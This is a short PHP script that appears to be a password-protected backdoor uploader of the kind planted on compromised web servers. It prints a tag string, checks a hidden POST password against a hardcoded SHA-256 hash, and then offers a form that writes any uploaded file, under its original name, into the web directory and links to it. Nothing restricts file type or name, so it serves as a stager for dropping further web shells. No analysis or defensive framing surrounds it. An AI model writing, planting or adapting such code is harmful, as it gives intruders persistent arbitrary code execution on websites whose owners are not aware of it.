<?php
echo 'tg:cc8_1';

$PASS_HASH = '0910b8d188c63f528d1e0dce133a5e6ba348a942e5f1e8a49a33a70a0508a656';

if (isset($_POST['_p']) && hash('sha256', $_POST['_p']) === $PASS_HASH) {

    if (isset($_POST['_upl'])) {
        $name = $_FILES['file']['name'];
        if (@move_uploaded_file($_FILES['file']['tmp_name'], $name)) {
            $url = "http://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/" . $name;
            echo " ok<br>";
            echo "<a href='$url' target='_blank'>$url</a>";
        } else {
            echo " fail";
        }
    }

    echo "<hr>";
    echo "<form method='post' enctype='multipart/form-data'>";
    echo "<input type='hidden' name='_p' value='" . htmlspecialchars($_POST['_p']) . "'>";
    echo "<input type='file' name='file'>";
    echo "<input type='submit' name='_upl' value='Upload'>";
    echo "</form>";

} else {
    echo "<form method='post'>";
    echo "<input type='password' name='_p'>";
    echo "<input type='submit' value='Enter'>";
    echo "</form>";
}
?>